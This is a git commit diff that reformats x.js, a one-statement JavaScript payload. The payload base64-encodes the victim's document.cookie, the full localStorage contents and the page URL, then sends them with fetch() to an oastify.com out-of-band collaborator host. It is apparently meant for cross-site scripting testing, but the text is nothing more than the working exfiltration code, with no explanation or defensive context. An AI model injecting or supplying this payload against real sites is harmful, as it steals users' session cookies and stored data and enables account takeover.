7bb8d3974dd004ca2e92292f577d4733d3d42360
AmirWilayah <119005771+AmirWilayah@users.noreply.github.com>
2025-07-08 00:55:49 +0800

    x.js

--- x.js
+++ x.js
@@ -1,4 +1,6 @@
 fetch("https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" +
-      btoa("cookie=" + document.cookie + 
-           "&ls=" + JSON.stringify(localStorage) + 
-           "&url=" + location.href));
+  btoa(
+    "cookie=" + document.cookie +
+    "&ls=" + JSON.stringify(localStorage) +
+    "&url=" + location.href
+  ));
